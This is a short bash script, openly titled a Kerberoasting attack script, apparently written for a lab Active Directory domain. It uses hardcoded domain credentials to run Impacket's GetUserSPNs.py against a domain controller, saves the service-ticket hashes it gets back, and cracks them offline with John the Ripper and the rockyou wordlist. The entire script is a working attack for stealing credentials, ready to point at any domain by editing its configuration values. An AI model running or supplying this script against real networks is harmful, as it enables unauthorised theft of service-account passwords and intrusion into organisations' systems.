#!/bin/bash
# ============================================================
# Kerberoasting Attack Script
# ============================================================
# Description: Enumerates SPNs and extracts TGS hashes
# MITRE ATT&CK: T1558.003
# ============================================================

set -e

# ---- Configuration ----
DC_IP="192.168.100.10"
DOMAIN="lab.local"
USER="user1"
PASS="User@1234"
OUTPUT="kerberoast_hash.txt"
WORDLIST="/usr/share/wordlists/rockyou.txt"

# ---- Colors ----
GREEN='\033[0;32m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${CYAN}[*] Starting Kerberoasting attack...${NC}"

# ---- Step 1: Extract TGS hashes ----
echo -e "${CYAN}[*] Step 1: Extracting TGS hashes...${NC}"
GetUserSPNs.py ${DOMAIN}/${USER}:${PASS} -dc-ip ${DC_IP} -request -outputfile ${OUTPUT}

if [ ! -f "${OUTPUT}" ]; then
    echo -e "${RED}[!] No hash extracted. Check credentials.${NC}"
    exit 1
fi

echo -e "${GREEN}[+] Hash extracted: ${OUTPUT}${NC}"

# ---- Step 2: Crack with John ----
echo -e "${CYAN}[*] Step 2: Cracking hash with John...${NC}"
john --wordlist=${WORDLIST} ${OUTPUT}

# ---- Step 3: Show results ----
echo -e "${CYAN}[*] Step 3: Results${NC}"
john --show ${OUTPUT}

echo -e "${GREEN}[+] Kerberoasting complete.${NC}"
